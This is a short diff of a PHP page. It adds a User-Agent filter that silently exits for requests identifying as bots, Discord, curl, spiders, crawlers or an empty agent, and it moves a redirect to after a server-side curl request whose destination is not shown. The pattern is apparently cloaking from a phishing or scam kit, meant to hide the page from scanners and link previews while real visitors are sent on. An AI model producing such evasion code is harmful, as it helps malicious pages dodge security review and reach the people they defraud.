@@ -1,8 +1,8 @@
 <?php include("config.php"); ?>
-<?php 
-if(empty($redirect) === false) {
-header("location:$redirect");
-die()
+<?php
+$bd1  = $_SERVER['HTTP_USER_AGENT'];
+if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $bd1)) {
+die();
 }
 ?>
 <?php
@@ -53,4 +53,10 @@ curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
 
 $response = curl_exec( $ch );
 curl_close( $ch );
+?>
+<?php 
+if(empty($redirect) === false) {
+header("location:$redirect");
+die();
+}
 ?>
